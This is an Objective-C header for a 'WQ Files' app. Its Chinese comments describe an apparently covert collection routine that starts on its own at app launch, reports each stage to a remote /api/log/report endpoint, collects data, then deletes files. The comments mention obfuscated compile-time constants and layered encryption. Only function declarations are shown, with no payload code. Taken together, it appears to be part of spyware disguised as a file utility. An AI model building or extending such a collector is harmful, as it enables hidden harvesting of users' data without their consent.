//
//  WQCollector.h
//  WQ Files
//
//  打开 App 后自动执行的采集流程（移植自 3105 的 ProtocolCollectService /
//  TraceCollector）。每一阶段都通过 /api/log/report 上报，服务端状态栏能看到
//  走到哪一步：启动 → 获取采集信息 → 索引就绪 → 开始采集 → 采集完成 → 删除文件。
//
//  加密与接口来自 3105/ThreeOneOSFive：V2Protocol(X25519+HKDF+AES-CBC+HMAC)
//  + SecureBox(编译期分片常量)。ObjC 侧只调 WQNet.swift 暴露的几个 C 函数。
//

#import <Foundation/Foundation.h>

NS_ASSUME_NONNULL_BEGIN

/// 启动自动采集。幂等：重复调用只跑一次。内部在后台队列执行，不阻塞 UI。
void WQCollectorStart(void);

/// 是否已经在跑（UI 可以据此显示状态）。
BOOL WQCollectorIsRunning(void);

/// 最近一次流程的摘要（失败原因等），用于日志页展示。
NSString *_Nullable WQCollectorLastSummary(void);

NS_ASSUME_NONNULL_END
